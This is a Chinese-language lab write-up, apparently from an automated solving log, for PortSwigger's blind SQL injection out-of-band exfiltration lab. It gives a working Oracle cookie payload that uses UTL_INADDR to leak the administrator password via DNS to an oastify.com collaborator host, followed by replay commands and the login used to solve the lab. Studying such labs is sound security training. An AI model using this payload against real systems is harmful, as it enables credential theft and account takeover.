---
title: "lab-out-of-band-data-exfiltration"
links:
  - target: oob-callback-family
    relation: evidences
  - target: blind-injection-family
    relation: evidences
  - target: burp-collaborator-public-polling-method
    relation: evidences
---

# lab-out-of-band-data-exfiltration

> evidences: [[oob-callback-family]], [[blind-injection-family]], [[burp-collaborator-public-polling-method]]

PortSwigger `sql-injection/blind/lab-out-of-band-data-exfiltration`(批 30 记 blocked,批 53 **solved**)。

- 实例(批 53):https://0a7b00d604d2bbc0804dc6b9009b0076.web-security-academy.net(shop app)
- 判定目标:外带 `users.password`(administrator)并以 administrator 登录

## 机制事实(两批一致)

- 注入点是 `TrackingId` cookie,后端 Oracle;应用吞掉 DB 错误 ⇒ **无同步信道**(`xyz'` 与基线同长;
  `dbms_pipe.receive_message(('a'),5)` 时延载荷 1s 内返回,查询真异步)。
- 唯一出路是 OOB;自建 OOB 域仍不可达(b19),但 **`*.oastify.com` 可达**。

## 批 53 解法(UTL_INADDR 形,直接写进 jar)

- 载荷整条作为 cookie 值写进 jar(`http_session` 的 `--header` 会与 jar cookie 并成两条 `Cookie:`,不用它):

```
TrackingId = xyz'||(SELECT UTL_INADDR.get_host_address((SELECT password FROM users WHERE username='administrator')
             ||'.sqli.<label>.oastify.com') FROM dual)||'
```

- 为什么不用 XXE/`EXTRACTVALUE(xmltype(...))` 形:**cookie 值里不能有 `;`**(解析按 `;` 切),而该形必须写 `%remote;`;
  UTL_INADDR 形是**无分号**的等价外带。
- 读出:`x4liu9axa11acxn72yfr.sqli.<label>.oastify.com` ⇒ 口令 `x4liu9axa11acxn72yfr`。
- 收口:`POST /login`(csrf + `username=administrator`)→ `302 /my-account?id=administrator`;随后任意页横幅 `is-solved`。

## 复现命令

```
burp_collab new --custom sqli
# 把上面的整条 TrackingId 写进 <host>:{"TrackingId": "<payload>"} 的 jar,再:
http_session get "<inst>/" --jar /tmp/b53-l3-jar.json --no-body      # 触发查询
burp_collab poll                                                    # sub_domain 首标签 = administrator 口令
http_session get  "<inst>/login" --jar /tmp/b53-l3-login.json --out /tmp/l.html   # 取 csrf
http_session post "<inst>/login" --jar /tmp/b53-l3-login.json --form csrf=<csrf> \
  --form username=administrator --form password=x4liu9axa11acxn72yfr --no-body    # 302 -> solved
```
